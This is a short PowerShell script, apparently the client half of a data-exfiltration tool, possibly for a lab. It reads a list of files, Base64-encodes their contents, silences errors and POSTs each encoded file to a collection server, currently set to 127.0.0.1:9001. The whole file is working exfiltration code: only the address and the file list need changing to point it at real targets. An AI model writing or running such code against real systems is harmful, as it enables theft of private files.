$fileList = "Exfil-client.ps1"

$exfilList = @()

$IP="127.0.0.1:9001"

foreach ($file in $fileList){
    $text = Get-Content -Path $file
    $exfilList += [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($text))
}

$ErrorActionPreference = "SilentlyContinue"

foreach($data in $exfilList){
    Write-Output "Starting new data exfil..."
    Invoke-WebRequest -Uri $IP -Method POST -Body $data
    Write-Output "Done. Waiting a bit for the server to restart"
    Start-Sleep -Seconds 5
}